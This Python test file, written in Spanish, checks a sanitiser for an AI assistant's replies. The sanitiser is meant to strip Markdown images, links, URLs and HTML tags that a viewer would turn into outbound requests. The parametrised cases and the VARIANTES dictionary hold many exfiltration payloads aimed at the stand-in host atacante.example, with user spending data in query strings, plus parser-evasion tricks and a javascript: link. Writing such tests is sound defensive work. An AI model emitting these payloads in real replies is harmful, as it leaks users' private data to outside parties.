"""Módulo 102: lo que escribe el modelo, sin canales para sacar datos. Se comprueba con lo que hace un visor de verdad:
el HTML que genera un parser CommonMark (markdown-it-py) a partir del texto saneado."""

import pytest
from markdown_it import MarkdownIt

from asistente.application.seguridad.sanear_respuesta import RETIRADO, sanear_respuesta

VISOR = MarkdownIt("commonmark")


@pytest.mark.parametrize(
    ("texto", "queda"),
    [
        ("Gastasteis 776,59 €. ![ok](https://atacante.example/p.png?d=776,59)", "Gastasteis 776,59 €. ok"),
        ("Mira [el detalle](https://atacante.example/?d=x) del mes.", "Mira el detalle del mes."),
        (
            "Más en https://atacante.example/?d=Supermercado-461 o www.atacante.example/x.",
            f"Más en {RETIRADO} o {RETIRADO}",
        ),
        ('Hecho <img src="https://atacante.example/p.png"> y ya.', "Hecho  y ya."),
        ("Ver [1].\n\n[1]: https://atacante.example/ref", "Ver [1]."),
        ("Pulsa data:text/html;base64,PHNjcmlwdD4= aquí", f"Pulsa {RETIRADO} aquí"),
    ],
)
def test_quita_imagenes_enlaces_y_urls(texto, queda):
    saneado, quitados = sanear_respuesta(texto)
    assert saneado.rstrip() == queda.rstrip()
    assert quitados >= 1


# Formas de pedir una URL que una expresión regular sola no ve: el parser sí
VARIANTES = {
    "texto alternativo con corchetes": "Total: 776,59 €\n\n![a [b] c](//atacante.example/p.png?d=776,59)",
    "con una entidad en la URL": "![a [b] c](https&#58;//atacante.example/p.png?d=776,59)",
    "enlace con corchetes": "[ver [detalle]](//atacante.example/?d=776,59)",
    "referencia definida en una cita": "![x][r]\n\n> [r]: //atacante.example/p.png?d=776,59",
    "referencia definida en una lista": "![x][r]\n\n- [r]: //atacante.example/p.png?d=776,59",
    "etiqueta con un corchete escapado": "![x][a\\]b]\n\n[a\\]b]: //atacante.example/p.png?d=776,59",
    "referencia vacía": "![x][]\n\n[x]: <//atacante.example/p.png>",
    "barras escapadas": "[x](\\/\\/atacante.example/p.png)",
    "corchetes anidados dos veces": "![a [b [c] d] e](//atacante.example/p.png?d=776,59)",
    "video con poster": '<video poster="//atacante.example/p.png?d=776,59"></video>',
    "svg con image": '<svg><image href="//atacante.example/p.png?d=776,59"/></svg>',
    "input de tipo image": '<input type="image" src="//atacante.example/p.png?d=776,59">',
    "object": '<object data="//atacante.example/p.png?d=776,59"></object>',
    "un estilo con url()": '<div style="background:url(//atacante.example/p.png?d=776,59)">x</div>',
    "esquema en mayúsculas": "![x](HTTPS://atacante.example/p.png)",
    "etiqueta en mayúsculas": "<IMG SRC=https://atacante.example/p.png>",
    "etiqueta partida en dos líneas": "<img\nsrc=//atacante.example/p.png>",
    "www sin esquema": "Mira www.atacante.example/?d=1",
    "autoenlace": "<https://atacante.example/?d=1>",
    "javascript:": "[a](javascript:alert(1))",
    "referencia en el nivel superior": "![x][r]\n\n[r]: //atacante.example/p.png",
    "destino en la línea siguiente": "![x][r]\n\n[r]:\n  //atacante.example/p.png",
}


@pytest.mark.parametrize("texto", VARIANTES.values(), ids=VARIANTES.keys())
def test_nada_que_un_visor_markdown_convierta_en_peticion(texto):
    saneado, quitados = sanear_respuesta(texto)
    html = VISOR.render(saneado)
    assert "atacante.example" not in html and "<img" not in html and "<a " not in html, html
    assert quitados >= 1


def test_lo_normal_no_cambia():
    texto = (
        "En septiembre gastasteis **776,59 €**; lo que más, Supermercado (59 %). Escribe a ana@example.com.\n\n"
        "- Supermercado: 412 €\n- Ocio: 80 €\n\n1. uno\n2. dos"
    )
    assert sanear_respuesta(texto) == (texto, 0)
